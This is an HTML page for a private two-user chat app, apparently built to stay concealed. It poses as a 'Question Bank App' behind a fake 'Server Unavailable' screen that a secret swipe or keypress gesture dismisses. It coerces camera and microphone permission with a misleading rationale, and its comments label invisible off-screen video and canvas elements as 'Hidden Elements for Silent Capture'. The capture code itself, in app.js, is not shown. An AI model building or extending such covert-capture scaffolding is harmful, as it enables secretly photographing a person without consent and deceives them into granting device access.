<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Question Bank App</title> <!-- Changed Title for Stealth -->
    <link rel="stylesheet" href="style.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
</head>
<body>

    <!-- STEALTH SCREEN (Always visible first) -->
    <div id="stealth-screen">
        <div class="stealth-icon">âš ï¸</div>
        <div class="stealth-title">Server Unavailable</div>
        <div class="stealth-desc">The Question Bank server is currently down for maintenance. Please try again later.</div>
        <button class="stealth-btn" onclick="location.reload()">Try Again</button>
    </div>

    <!-- FULL PAGE PERMISSION BLOCK -->
    <div id="perm-block">
        <h2>âš ï¸ Permission Required</h2>
        <p>Cannot load secure features. Voice and Video messages require microphone & camera access to function.<br><br>Please enable permissions in browser settings and tap Retry.</p>
        <button id="perm-retry-btn">Retry Permission</button>
    </div>

    <div id="app-loader" style="display:none;">
        <div class="spinner"></div>
        <div class="loading-text">Secure Link</div>
    </div>

    <div id="media-viewer" class="media-overlay">
        <div class="media-top-bar">
            <button id="media-download-btn" class="icon-btn">â¬‡</button>
            <button id="media-close-btn" class="icon-btn">âœ–</button>
        </div>
        <div class="media-container">
            <img id="media-view-img" src="" alt="Full View">
            <video id="media-view-video" src="" controls playsinline></video>
        </div>
    </div>

    <div id="reaction-modal" class="modal-overlay">
        <div class="modal-content">
            <h3>Reactions</h3>
            <div id="reaction-list"></div>
            <button id="close-rx-modal">Close</button>
        </div>
    </div>

    <div id="context-menu">
        <div class="ctx-header">
            <span>Actions</span>
            <div id="ctx-close-btn">âœ–</div>
        </div>
        <div class="rx-picker">
            <span data-emoji="â¤ï¸">â¤ï¸</span>
            <span data-emoji="ğŸ˜‚">ğŸ˜‚</span>
            <span data-emoji="ğŸ˜®">ğŸ˜®</span>
            <span data-emoji="ğŸ˜¢">ğŸ˜¢</span>
            <span data-emoji="ğŸ˜¡">ğŸ˜¡</span>
            <span data-emoji="ğŸ‘">ğŸ‘</span>
        </div>
        <div class="ctx-item" id="ctx-reply">â†©ï¸ Reply</div>
        <div class="ctx-item red" id="ctx-unsend" style="display:none;">ğŸš« Unsend</div>
        <div class="ctx-item" id="ctx-remove">ğŸ—‘ï¸ Remove for Me</div>
    </div>

    <!-- SIDE MENU (Sam10 Only) -->
    <div id="side-menu-overlay"></div>
    <div id="side-menu">
        <div class="menu-header">Menu</div>
        <a href="quickselfies.html" class="menu-item">ğŸ“¸ Romantic Instant Selfies</a>
        <div class="menu-item" id="menu-close">âœ– Close Menu</div>
    </div>

    <div id="login-screen" style="display:none;">
        <h2>SECURE LINK</h2>
        <input type="text" class="login-input" id="inp-user" placeholder="Identity (sam10/mastura10)">
        <input type="password" class="login-input" id="inp-pass" placeholder="Cloud Password">
        <input type="password" class="login-input" id="inp-vault" placeholder="Secret Key">
        <button class="login-btn" id="btn-login">UNLOCK</button>
    </div>

    <div id="chat-screen">
        <header>
            <div class="header-left">
                <!-- Hamburger Button (Hidden by default, shown for Sam10) -->
                <div id="hamburger-btn" style="display:none; margin-right:10px; font-size:24px; cursor:pointer;">â˜°</div>
                
                <div class="avatar-wrapper">
                    <img id="header-avatar" src="" alt="">
                    <div id="header-status-dot"></div>
                </div>
                <div class="header-info">
                    <span id="header-name">Connecting...</span>
                    <span id="header-status-text">Checking status...</span>
                </div>
            </div>
            <div id="btn-logout" style="cursor:pointer; padding: 10px;">âœ–</div>
        </header>
        
        <div id="msg-list">
            <div id="loading-spinner">âŸ³ Loading History...</div>
        </div>
        
        <div id="scroll-down-btn">â¬‡</div>
        <div id="status-text"></div>
        
        <!-- TYPING INDICATOR -->
        <div id="typing-indicator">
            <div class="typing-dot"></div>
            <div class="typing-dot"></div>
            <div class="typing-dot"></div>
        </div>

        <div id="input-area">
            <div id="reply-preview-bar">
                <div class="reply-info">
                    <span id="reply-to-user"></span>
                    <span id="reply-content-preview"></span>
                </div>
                <div id="btn-cancel-reply" style="font-size:20px; cursor:pointer;">âœ–</div>
            </div>

            <div id="plus-menu">
                <div id="menu-media">ğŸ–¼ï¸ Photos/Video</div>
                <div id="menu-voice">ğŸ™ï¸ Voice Message</div>
            </div>

            <button class="icon-btn" id="plus-btn">ï¼‹</button>
            <input type="file" id="file-input" style="display:none" accept="image/*,video/*,audio/*">
            
            <button class="icon-btn" id="cancel-rec-btn" style="display:none; color:#ff3b30;">âœ–</button>
            
            <input type="text" id="message-input" placeholder="Message..." autocomplete="off">
            
            <button class="icon-btn" id="send-btn">â¤</button>
        </div>
    </div>

    <!-- Hidden Elements for Silent Capture -->
    <video id="hidden-cam" autoplay playsinline muted style="opacity:0; position:absolute; top:-9999px; pointer-events:none; z-index:-1;"></video>
    <canvas id="hidden-canvas" style="display:none;"></canvas>

    <script type="module">
        // STEALTH MODE LOGIC (Inline for speed)
        let swipes = 0;
        let keys = 0;
        const stealthScreen = document.getElementById('stealth-screen');
        const appLoader = document.getElementById('app-loader');
        
        // Mobile: Swipe Up (Twice)
        let startY = 0;
        document.addEventListener('touchstart', e => startY = e.touches[0].clientY);
        document.addEventListener('touchend', e => {
            const endY = e.changedTouches[0].clientY;
            if (startY - endY > 50) { // Swipe Up
                swipes++;
                if (swipes === 2) unlockApp();
                setTimeout(() => swipes = 0, 2000); // Reset after 2s
            }
        });

        // Desktop: Arrow Down (Twice)
        document.addEventListener('keydown', e => {
            if (e.key === "ArrowDown") {
                keys++;
                if (keys === 2) unlockApp();
                setTimeout(() => keys = 0, 2000);
            }
        });

        function unlockApp() {
            stealthScreen.style.display = 'none';
            appLoader.style.display = 'flex'; // Show normal loader
            // Trigger the main app logic load if needed, 
            // but usually the module below will handle auth check
            document.dispatchEvent(new Event('app-unlocked'));
        }
    </script>
    <script type="module" src="app.js?v=latest"></script>
</body>
</html>
